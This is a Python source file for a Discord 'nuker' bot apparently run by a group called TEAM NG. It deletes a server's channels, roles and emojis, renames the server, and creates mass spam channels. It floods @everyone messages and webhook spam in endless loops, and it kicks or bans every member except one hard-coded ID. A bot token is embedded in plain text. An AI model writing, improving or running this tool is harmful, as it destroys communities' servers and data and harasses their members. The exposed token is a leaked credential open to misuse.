import os
import discord
from discord.ext import commands
import random
from webserver import keep_alive
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
import asyncio




CHANNEL_NAMES =  ["lmao nuked by TEAM NG", "nuked by TEAM NG"]
Shubham_OP = ["TEAM NG ON TOP"]
SPAM_MESSAGE = ["@everyone @here NUKED BY BIGGEST NUKERS **TEAM NG**  https://media.discordapp.net/attachments/983650055997239337/983689245740904448/ng_banner_final.png","@everyone @here https://discord.gg/bXTAYxBN4x"]
WEBHOOK_NAMES = ['NUKE1','NUKE2','NUKE3', 'NUKE4', 'NUKE5','NUKE6','NUKE7','NUKE8','NUKE9']


intents = discord.Intents.all()
client = discord.Client()
client = commands.Bot(command_prefix=".", intents=intents)


@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "TEAM NG ON TOP"))
  print('''╔╗─╔╗──╔╗
║║─║║──║║
║╚═╝╠╗╔╣║╔╦══╦═╗
║╔═╗║║║║╚╝╣║═╣╔╝
║║─║║╚╝║╔╗╣║═╣║
╚╝─╚╩══╩╝╚╩══╩╝'''
       
        f"Logged as {client.user}")


@client.command()
async def start(ctx, amount = 50):
  await ctx.message.delete()
  await ctx.guild.edit(name="TEAM NG ON TOP")
  guild = ctx.guild
  for channel in guild.channels:
      try:
        await channel.delete()
      except:
        pass
  for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
     except:
       pass
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
    except:
      pass
  for role in ctx.guild.roles:
    try:
      await role.delet()
    except:
      pass
  for i in range(1000):  
    for i in range(10000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(SPAM_MESSAGE))
        except:
          pass
  for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="Beamed")
        except:
          pass

@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="beamed")
    except:
      pass

@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.message.delete()

@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline)
    await ctx.message.delete()

@client.command()
async def spamca(ctx):
  await ctx.message.delete()
  while True:
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    await ctx.guild.create_category(name=f"{Shubham_OP}")
    

@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))
token = ("OTgyNTk3OTA0MDc2MjQyOTg0.GyPPZs.hVBsiZSC5rCqgZjm3QmR9h8bZxPgZTe6rUdBs0")
client.run(token)